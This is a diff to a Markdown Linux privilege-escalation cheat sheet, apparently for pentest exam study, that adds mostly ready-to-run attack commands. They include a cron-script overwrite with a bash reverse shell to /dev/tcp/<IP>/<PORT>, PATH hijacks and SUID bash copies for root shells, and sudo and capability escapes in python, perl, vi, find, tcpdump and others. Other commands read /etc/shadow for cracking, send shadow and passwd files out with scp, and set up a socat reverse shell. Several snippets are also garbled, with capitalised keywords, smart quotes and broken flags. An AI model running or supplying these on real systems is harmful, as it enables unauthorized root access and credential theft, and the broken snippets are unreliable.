@@ -1,32 +1,38 @@
 # Linux-Privilege-Escalation
-
+Synthesize, supplement from a number of other resources
+Editing and addition: TranQuac
 ## Summary
 
 * [Tools](#tools)
-* [SSH Key](#ssh-key)
-    * [Sensitive files](#sensitive-files)
-    * [SSH Key Predictable PRNG (Authorized_Keys) Process](#ssh-key-predictable-prng-authorized_keys-process)
 * [Scheduled tasks](#scheduled-tasks)
     * [Cron jobs](#cron-jobs)
     * [Systemd timers](#systemd-timers)
+* [PATH Variables](#path-variables)
 * [SUID](#suid)
     * [Find SUID binaries](#find-suid-binaries)
+    * [Exploitation](#exploitation-suid)
     * [Create a SUID binary](#create-a-suid-binary)
 * [Capabilities](#capabilities)
     * [List capabilities of binaries](#list-capabilities-of-binaries)
     * [Edit capabilities](#edit-capabilities)
     * [Interesting capabilities](#interesting-capabilities)
 * [SUDO](#sudo)
-    * [NOPASSWD](#nopasswd)
-    * [LD_PRELOAD and NOPASSWD](#ld_preload-and-nopasswd)
+    * [Allow Root Privilege to Binary commands](#allow-root-privilege-to-binary-commands)
+    * [Allow Root Privilege to Shell Script](allow-root-privilege-to-shell-script)
+    * [Allow Sudo Right to other Programs](allow-sudo-right-to-other-programs)
+    * [LD_PRELOAD](#ld_preload)
     * [Doas](#doas)
-    * [sudo_inject](#sudo-inject)
+    * [sudo_inject](#sudo_inject)
     * [CVE-2019-14287](#cve-2019-14287)
 * [GTFOBins](#gtfobins)
 * [Wildcard](#wildcard)
 * [Writable files](#writable-files)
     * [Writable /etc/passwd](#writable-etcpasswd)
     * [Writable /etc/sudoers](#writable-etcsudoers)
+* [Exploiting Services](#exploiting-services)
+    * [Services manual enumeration](#services-manual-enumeration)
+    * [Automatic enumeration](automatic-enumeration)
+    * [Port forwarding](port-forwarding)
 * [NFS Root Squashing](#nfs-root-squashing)
 * [Shared Library](#shared-library)
     * [ldconfig](#ldconfig)
@@ -76,68 +82,15 @@ Here are a few:
 - [unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
 - [Privilege Escalation through sudo - Linux](https://github.com/TH3xACE/SUDO_KILLER)
 
-## SSH Key
-
-### Sensitive files
-
-```
-find / -name authorized_keys 2> /dev/null
-find / -name id_rsa 2> /dev/null
-...
-```
-
-### SSH Key Predictable PRNG (Authorized_Keys) Process
-
-This module describes how to attempt to use an obtained authorized_keys file on a host system.
-
-Needed : SSH-DSS String from authorized_keys file
-
-**Steps**
-
-1. Get the authorized_keys file. An example of this file would look like so:
-
-```
-ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... 
-```
-
-2. Since this is an ssh-dss key, we need to add that to our local copy of `/etc/ssh/ssh_config` and `/etc/ssh/sshd_config`:
-
-```
-echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/ssh_config
-echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/sshs_config
-/etc/init.d/ssh restart
-```
-
-3. Get [g0tmi1k's debian-ssh repository](https://github.com/g0tmi1k/debian-ssh) and unpack the keys:
-
-```
-git clone https://github.com/g0tmi1k/debian-ssh
-cd debian-ssh
-tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
-```
-
-4. Grab the first 20 or 30 bytes from the key file shown above starting with the `"AAAA..."` portion and grep the unpacked keys with it as:
-
-```
-grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'
-dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub
-```
-
-5. IF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub) public file. To use the private key file to connect, drop the '.pub' extension and do:
-
-```
-ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934
-```
-
-And you should connect without requiring a password. If stuck, the `-vvv` verbosity should provide enough details as to why.
-
 ## Scheduled tasks
 
 ### Cron jobs
 
 Check if you have access with write permission on these files.   
 Check inside the file, to find other paths with write permissions.   
-
+```bash
+$cat /etc/crontab
+```
 ```powershell
 /etc/init.d
 /etc/cron*
@@ -172,7 +125,36 @@ You can use [pspy](https://github.com/DominicBreuker/pspy) to detect a CRON job.
 # print both commands and file system events and scan procfs every 1000 ms (=1sec)
 ./pspy64 -pf -i 1000 
 ```
+####Cron job Bash exploit
+Overwrite the Bash script with the following if you have write permissions:
+```bash
+#!/bin/bash		
+bash -i >& /dev/tcp/<IP>/<PORT> 0>&1  # amend <IP> and <PORT>
+```
+Setup a Netcat listener and wait for the cron job to execute the script.
 
+####Cron job PATH environment variable exploit
+Run lse.sh and check for “Can we write to any paths present in cron jobs”.
+Create the following script matching the name of the cron job in /tmp:
+```bash
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+```
+
+Make sure the script is executable:
+```bash
+chmod +x <CRON-SCRIPT>.sh
+```
+Wait for the cron job to run and then execute the newly created SUID script in /tmp:
+```bash
+/tmp/rootbash
+```
+You will now have a root shell.
+
+Refer: 
+[linux-privilege-escalation-by-exploiting-cron-jobs](https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/)
+[https://materials.rangeforce.com/tutorial/2020/04/17/Cron-Privilege-Escalation/](https://materials.rangeforce.com/tutorial/2020/04/17/Cron-Privilege-Escalation/)
 
 ## Systemd timers
 
@@ -186,6 +168,94 @@ Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 d
 3 timers listed.
 ```
 
+## PATH Variables
+First, search for the file having SUID or 4000 permission with help of Find command.
+```bash
+$find / -perm -u=s -type f 2>/dev/null
+#home/quac/script/shell
+```
+
+### If executing `ps` in the shell, Example:
+```bash
+#include <unistd.h>
+void main(){
+	setuid(0);
+	setgid(0);
+	system("ps");
+}
+```
+Then:
+`Method 1:`
+```bash
+$cd /tmp
+$echo "/bin/bash" > ps
+$chmod 777 ps
+$echo $PATH
+$export PATH=/tmp:$PATH
+$cd /home/raj/script
+$./shell
+$whoami
+#root
+```
+
+`Method 2:`
+```bash
+cd /home/quac/script/
+cp /bin/sh /tmp/ps
+echo $PATH
+export PATH=/tmp:$PATH
+./shell
+whoami
+```
+
+### If executing `id` in the shell, Example:
+```bash
+#include <unistd.h>
+void main(){
+	setuid(0);
+	setgid(0);
+	system("id");
+}
+```
+Then:
+```bash
+$cd /tmp
+$echo "/bin/bash" > id
+$chmod 777 id
+$echo $PATH
+$export PATH=/tmp:$PATH
+$cd /home/quac/script
+$./shell
+$whoami
+```
+
+### If executing `cat` in the shell, Example:
+```bash
+#include <unistd.h>
+void main(){
+	setuid(0);
+	setgid(0);
+	system("cat /etc/passwd");
+}
+```
+Then:
+```bash
+$cd /tmp
+$nano cat
+/bin/bash
+```
+```bash
+$chmod 777 cat
+$ls -al cat
+$echo $PATH
+$export PATH=/tmp:$PATH
+$cd /home/quac/script
+$./shell
+$whoami
+```
+
+Refer: [https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)
+
 ## SUID
 ### Find SUID binaries
 
@@ -194,7 +264,7 @@ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 find / -uid 0 -perm -4000 -type f 2>/dev/null
 ```
 
-### Exploitation
+### Exploitation SUID
 Cp
 ```bash
 $cp /etc/passwd /var/www/html
@@ -256,12 +326,12 @@ $sudo chmod +s /tmp/suid # setuid bit
 
 
 ## Capabilities
-
 ### List capabilities of binaries 
-
 ```bash
-╭─swissky@lab ~  
-╰─$ /usr/bin/getcap -r  /usr/bin
+getcap -r / 2>/dev/null
+```
+```bash  
+$ /usr/bin/getcap -r  /usr/bin
 /usr/bin/fping                = cap_net_raw+ep
 /usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
 /usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
@@ -293,14 +363,38 @@ cap_dac_read_search # read anything
 cap_setuid+ep # setuid
 ```
 
-Example of privilege escalation with `cap_setuid+ep`
-
+Privilege escalation with `cap_setuid+ep` and `python`
 ```powershell
-$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
+$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python3
 
-$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
-sh-5.0# id
+$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+$ id
 uid=0(root) gid=1000(swissky)
+```
+
+Privilege escalation with `cap_setuid+ep` and `Perl`
+```powershell
+$./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
+#•	perl -e allows us to execute perl code.
+#•	use POSIX (setuid); imports the required module.
+#•	POSIX::setuid(0); sets the UID to 0, which is root.
+#•	exec "/bin/bash"; executes bash as root.
+```
+
+Privilege escalation with `cap_dac_read_search` and `zip`
+```powershell
+$/path/to/zip /tmp/shadow.zip /etc/shadow
+#/path/to/ is the directory of the zip file with the added capability.
+#Next, we extract that archive: 
+$unzip /tmp/shadow.zip -d /tmp
+#Then, we can simply read the file: 
+$cat /tmp/etc/shadow
+```
+Privilege escalation with `tar = cap_dac_read_search+ep`
+```powershell
+$tar -cvf shadow.tar /etc/shadow
+$tar -xvf shadow.tar
+$cat /etc/shadow
 ```
 
 | Capabilities name  | Description |
@@ -320,30 +414,162 @@ uid=0(root) gid=1000(swissky)
 | CAP_MAC_ADMIN  | Allow MAC configuration or state changes  |
 | CAP_NET_RAW  | Use RAW and PACKET sockets |
 | CAP_NET_BIND_SERVICE  | SERVICE Bind a socket to internet domain privileged ports  |
+Reference: [Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
 
 ## SUDO
 
 Tool: [Sudo Exploitation](https://github.com/TH3xACE/SUDO_KILLER)
 
-### NOPASSWD
-
 Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.
-
+View sudo rights:
 ```bash
 $ sudo -l
-
-User demo may run the following commands on crashlab:
-    (root) NOPASSWD: /usr/bin/vim
 ```
-
-In this example the user `demo` can run `vim` as `root`, it is now trivial to get a shell by adding an ssh key into the root directory or by calling `sh`.
-
+###Allow Root Privilege to Binary commands
+(root) ALL: run all command as root user.
 ```bash
-sudo vim -c '!sh'
-sudo -u root vim -c '!sh'
+$sudo su
+#or
+$sudo bash
+```
+Find
+```bash
+$sudo find /home -exec /bin/bash \;
+$sudo find . -exec /bin/sh \; -quit
+```
+Perl 
+```bash
+$sudo perl -e 'exec "/bin/bash";'
+```
+Python
+```bash
+$sudo python -c 'import pty;pty.spawn("/bin/bash")'
+```
+Less
+```bash
+$sudo less /etc/profile 
+$!/bin/sh or !bash
+```
+Time
+```bash
+$sudo time /bin/bash
+```
+AWK
+```bash
+$sudo awk 'BEGIN {system("/bin/bash")}'
+```
+Man
+```bash
+$sudo man man
+!bash
+```
+Vi
+```bash
+$Sudo vi
+:!bash
+```
+```bash
+$sudo vi -c '!bash'
+```
+Sed
+```bash
+$Sudo sed -n ‘le exec sh 1>&0’ /etc/passwd
+```
+Xxd
+```bash
+$xxd "/etc/shadow" | xxd -r
+#crack pass with john
+```
+Cat:
+```bash
+$sudo cat /etc/shadow -> crack pass(john/hashcat)
 ```
 
-### LD_PRELOAD and NOPASSWD
+### Allow Root Privilege to Shell Script
+
+ALL= (root) NOPASSWD: /bin/script/file.sh, /bin/script/file.py, shell
+
+Python
+```bash
+#!  /usr/bin/python
+Import os
+Os.system(“/bin/bash”)
+```
+C
+```bash
+#include<stdio.h>
+#include <unistd.h>
+#include<sys/types.h>
+Int main(){
+	Setuid(geteuid());
+	System(“/bin/bash”);
+	Return 0;
+}
+```
+```bash
+$Gcc demo.c -o shell
+./shell
+```
+Bash script
+```bash
+#! /bin/bash
+/bin/bash
+```
+
+### Allow Sudo Right to other Programs
+
+ALL=(ALL) NOPASSWD: /usr/bin/env, /usr/bin/ftp, /usr/bin/scp, /usr/bin/socat
+
+Env
+```bash
+$sudo env /bin/bash
+```
+FTP/GDB
+```bash
+$Sudo ftp
+$!/bin/bash
+```
+Socat
+```bash
+$socat file:`tty`,raw,echo=0 tcp-listen:1234 (attacker)
+$sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:$IP:1234 (victim)
+```
+SCP
+Syntax: scp SourceFile user@host:~/path of the directory
+```bash
+$sudo scp /etc/passwd user@$IP:~/
+$sudo scp /etc/shadow user@$IP:~/
+```
+Zip 
+```bash
+$sudo zip /tmp/test.zip /tmp/test -T --unzip-command=”sh -c /bin/bash”
+```
+Tar
+```bash
+$sudo tar cf /dev/null testfile --checkpoint=1 — checkpointaction=exec=/bin/bash
+```
+Strace 
+```bash
+sudo strace -o/dev/null /bin/bash
+```
+Tcpdump
+```bash
+$ echo $’id\ncat /etc/shadow’ > /tmp/.shell
+$ chmod +x /tmp/.shell
+$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.shell -Z root
+```
+Nmap
+```bash
+$ sudo nmap --interactive
+nmap> !sh
+```
+Git
+```bash
+$ sudo git help status
+: !/bin/bash
+```
+
+### LD_PRELOAD
 
 If `LD_PRELOAD` is explicitly defined in the sudoers file
 
@@ -392,7 +618,6 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 Slides of the presentation : [https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf](https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf)
-
 
 ### CVE-2019-14287
 
@@ -497,6 +722,42 @@ echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
 echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
 echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
 ```
+## Exploiting Services
+
+It’s always worth checking services because you might find a version that has a PoC exploit available.
+
+You might also find internal services that can be accessed by port forwarding.
+
+
+### Services manual enumeration
+Search for services running as root:
+
+`ps aux | grep "^root"`
+
+Enumerate version details:
+
+`<SERVICE> --version`
+or
+`dpkg -l | grep <SERVICE>`
+or
+`rpm -qa | grep <SERVICE>`
+
+### Automatic enumeration
+lse.sh:
+
+`./lse.sh -l 1 -i`
+Check for services like MySQL. Can you login as root wtihout password?
+Run service versions through searchsploit to check for PoC exploits.
+### Port forwarding
+Port forwarding is something you definitely need to be able to do for your exam.
+I found it a bit confusing at first but once you get the concept it’s quite straight forward.
+Run netstat to check for open internal ports:
+
+`netstat -nl`
+
+Port forward via SSH:
+`ssh -R <KALI-PORT>:127.0.0.1:<SERVICE-PORT> <KALI-USERNAME>@<KALI-IP>`
+Example: `ssh -R 5555:127.0.0.1:3306 root@10.10.10.10`
 
 ## NFS Root Squashing
 
@@ -706,17 +967,7 @@ https://www.exploit-db.com/exploits/18411
 
 
 ## References
-
-- [SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m](https://mn3m.info/posts/suid-vs-capabilities/)
+-[https://thecryptonian.co.uk/linux-privilege-escalation-cheat-sheet/](https://thecryptonian.co.uk/linux-privilege-escalation-cheat-sheet/#Sudo_LD_LIBRARY_PATH_Privilege_Escalation)
+-[https://www.hackingarticles.in/category/privilege-escalation/](https://www.hackingarticles.in/category/privilege-escalation/)
+- [swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
 - [Privilege escalation via Docker - April 22, 2015 - Chris Foster](https://fosterelli.co/privilege-escalation-via-docker.html)
-- [An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)
-- [Exploiting wildcards on Linux - Berislav Kucan](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/)
-- [Code Execution With Tar Command - p4pentest](http://p4pentest.in/2016/10/19/code-execution-with-tar-command/)
-- [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
-- [HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018](https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/)
-- [Privilege Escalation via lxd - @reboare](https://reboare.github.io/lxd/lxd-escape.html)
-- [Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
-- [Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc](https://github.com/nongiach/sudo_inject)
-* [Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates](http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html)
-* [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
-* [SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/SSH/key-exploit.md)
